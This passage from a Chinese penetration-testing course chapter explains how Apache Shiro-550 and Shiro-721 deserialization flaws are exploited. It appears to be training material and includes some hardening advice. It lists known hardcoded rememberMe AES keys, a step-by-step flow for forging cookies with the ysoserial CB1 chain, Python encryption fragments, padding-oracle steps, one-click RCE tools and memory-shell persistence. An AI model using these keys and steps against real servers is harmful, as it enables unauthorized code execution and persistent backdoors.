5. **Shiro-721（CVE-2019-12422）**：Padding Oracle攻击 → 不知道密钥也能打，1.2.5~1.4.1通杀，但是慢
6. **新手神器**：ShiroScan扫密钥 → ShiroExploit GUI一键RCE

### 面试高频问答 ⏰

| 问题 | 标准答案 |
|-----|---------|
| Shiro漏洞特征？ | Cookie里有rememberMe=deleteMe字段 |
| Shiro-550和721区别？ | 550要知道密钥（硬编码），721不知道密钥也能打（Padding Oracle） |
| 最常用的Shiro密钥？ | `kPH+bIxk5D2deZiIxcaaaA==`，一个打中一半 |
| 首选Gadget链？ | CommonsBeanutils1，SpringBoot环境通用 |
| 目标不出网怎么办？ | CB1纯本地链，不用出网，直接写文件/写Webshell |

下一章，我们要讲"**核弹级漏洞**"——**Log4j2 CVE-2021-44228（Log4Shell）深度利用大全！** JNDI各种利用链、JDK版本bypass、XXE信息泄露、WAF绕过……全网影响最广的Java漏洞，我们一次性讲透！不见不散！🔥

---

> 💡 新手小提示：
> 1. Shiro工具都需要Java环境，确保Kali里 `java -version` 能正常运行
> 2. ShiroScan碰到目标不出网就手动挑CB1链，不要选需要JNDI的链
> 3. 先拿 Vulhub 里的 Shiro 靶场练 3 遍，形成肌肉记忆，以后碰到真实场景直接按流程打！

---

# 🖼️ 本章拓展图解汇总（day-41 · 共20张SVG架构图）


<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="g9ovti3kp" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#g9ovti3kp)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#0369a1" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🧭 Shiro 框架架构一览</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Subject 主体(当前用户)</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">SecurityManager 核心调度器</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Realm 数据源(认证/授权)</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">SessionManager 会话管理</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">RememberMeManager 记住我</text>
  <rect x="540" y="163" width="220" height="55" rx="10" fill="#ecfeff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">FilterChain 过滤器链</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="gvmgxv5rk" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#gvmgxv5rk)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#1e3a8a" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🍪 RememberMe Cookie 加密全链路</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Principals Collection 序列化对象</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">GZIP.compress 压缩字节流</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">AES-CBC 模式加密</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">IV随机16字节 拼接密文前</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Base64 编码整体 → Set-Cookie: rememberMe=...</text>
</svg>

<svg width="800" height="309" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 309">
  <defs><linearGradient id="glsbcpdwb" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="309" rx="12" fill="url(#glsbcpdwb)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#0e7490" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🔍 Shiro 指纹识别8法</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">① rememberMe=deleteMe Cookie 响应头</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">② 两次 Set-Cookie rememberMe 特征</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">③ 401未授权 页面Shiro样式</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">④ shiro.ini 路径报错堆栈</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">⑤ /login.jsp;JSESSIONID URL风格</text>
  <rect x="540" y="163" width="220" height="55" rx="10" fill="#ecfeff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">⑥ doFilter JS/堆栈</text>
  <rect x="60" y="236" width="220" height="55" rx="10" fill="#fef2f2" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="268.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">⑦ rememberMe=1 → 302重定向</text>
  <rect x="300" y="236" width="220" height="55" rx="10" fill="#f0f9ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="268.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">⑧ Www-Authenticate: BASS 头</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="gc7kkkhj0" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#gc7kkkhj0)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#7f1d1d" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🔑 Shiro常见硬编码密钥Top</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">kPH+bIxk5D2deZiIxcaaaA==</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Z3VucwAAAAAAAAAAAAAAAA==</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">2AvVhdsgUs0FSA3SDFAdag==</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">4AvVhmFLUs0KTA3Kprsdag==</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">wGiHplamyXlVB11UXWol8g==</text>
  <rect x="540" y="163" width="220" height="55" rx="10" fill="#ecfeff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">剩余150+ 见 shiro_keys.txt 字典</text>
</svg>

<svg width="800" height="309" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 309">
  <defs><linearGradient id="g7pnsgl4p" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="309" rx="12" fill="url(#g7pnsgl4p)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#991b1b" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🧨 Shiro-550 攻击流程7步</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">① ysoserial CB1 生成序列化恶意对象</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">② GZIP.compress 压缩</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">③ Base64解码AES密钥(128bit)</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">④ AES-CBC IV=零或随机 加密</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">⑤ IV+CIPHER 拼接 → Base64</text>
  <rect x="540" y="163" width="220" height="55" rx="10" fill="#ecfeff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">⑥ Cookie rememberMe= 值</text>
  <rect x="60" y="236" width="220" height="55" rx="10" fill="#fef2f2" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="268.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">⑦ 服务端解密反序列化 触发RCE</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="g36toqgpw" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#g36toqgpw)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#7c2d12" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🛠️ ysoserial 三条常用链对比</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">链1 CommonsBeanutils1 CB1 无额外依赖</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">链2 CommonsCollections1 CC1 需commons-collections:3.1</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">链3 CommonsCollections5/6 CC兼容广</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">CB1适用最广 Shiro自带依赖</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">CC链需目标有对应 commons-collections</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="g8ir3etfd" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#g8ir3etfd)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#92400e" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🧪 手搓Python 加密脚本要点</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">base64.b64decode(key_str) → 16字节AES密钥</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">gzip.compress(ysoserial_bytes)</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">AES.new(key, AES.MODE_CBC, iv=16*b"\x00")</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">pad 填充 PKCS7 至16倍数</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">return base64.b64encode(iv + ct_bytes).decode()</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="gfpw48gyx" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#gfpw48gyx)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#4c1d95" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🔐 Shiro-721 Padding Oracle 原理</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">CBC模式: 明文块 XOR 前一个密文块</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">逐字节翻转前置密文字节</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">观察服务端响应(302登录有效 vs 401解密失败)</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Padding正确/Invalid 两种反馈</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">逐块恢复明文或伪造任意密文块</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="gf2qtsg0v" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#gf2qtsg0v)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#422006" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🧰 Shiro 工具链全家桶</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">经典 shiro.py 脚本</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">ShiroScan Burp 插件(一键检测+利用)</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">shiro_key_爆破字典.txt 200+密钥</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">ShiroExploit GUI图形化工具</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">ShiroAttack2 批量扫描</text>
  <rect x="540" y="163" width="220" height="55" rx="10" fill="#ecfeff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Nuclei: http/shiro-detect templates</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="givwb4lcs" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#givwb4lcs)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#0f172a" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🧱 CB1 vs CommonsCollections 差异</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">CB1: 依赖 Shiro 自带 commons-beanutils</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">CB1: 兼容 Shiro 1.2~1.7 绝大多数版本</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">CC1: 需 commons-collections 3.1 老版本</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">CC5/CC6: LazyMap+TiedMapEntry 组合</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">CC6: 兼容 commons-collections 3.2.1</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="gn76hv49m" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#gn76hv49m)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#075985" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">📐 Cookie 长度与AES块关系</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">AES 块大小固定 16字节</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">不足 PKCS7 自动补齐</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">序列化+GZIP 结果越大 Cookie越长</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">rememberMe 正常长度 400~1800字符</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">异常超长/短 = 可疑失败回显信号</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="gq4s0vtmt" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#gq4s0vtmt)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#be123c" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">📈 Shiro版本 vs 利用成功率</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Shiro 1.2.4: CB1链 100% 成功</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Shiro 1.3.2: 550仍有效 几乎100%</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Shiro 1.4.1: 550有效 约95%</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Shiro 1.4.2+: 开始修复550 降至40%</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Shiro 1.8.0+: 550修复 721仍可能(约30%)</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="ge5s092j0" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#ge5s092j0)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#7c3aed" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🧩 内存马 + Shiro-550 进阶组合</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">① Spring MVC Controller 内存马</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">② Filter 过滤器内存马</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">③ ServletContextListener 监听器马</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">④ Tomcat Valve 内存马</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">⑤ WebSocket 内存马 隐蔽型</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="gy4fv30pv" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#gy4fv30pv)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#0e7490" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🌐 出网 vs 不出网 利用矩阵</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">出网: DNS探测 + JNDI RCE + 上线</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">半出网: DNSLog盲探测版本/组件</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">不出网: CB1 纯本地反序列化</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">不出网 + echo: RCE 回显命令结果</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">不出网 + 内存马: 永久后门</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="gslizrgbo" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#gslizrgbo)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#166534" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🛡️ Shiro 安全加固5件套</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">① 升级 Shiro 至 1.12.0+ 最新版</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">② 替换密钥为 SecureRandom 64位随机 Base64</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">③ rememberMe=false 全局禁用记住我</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">④ JSESSIONID Cookie: HttpOnly + Secure + SameSite</text>
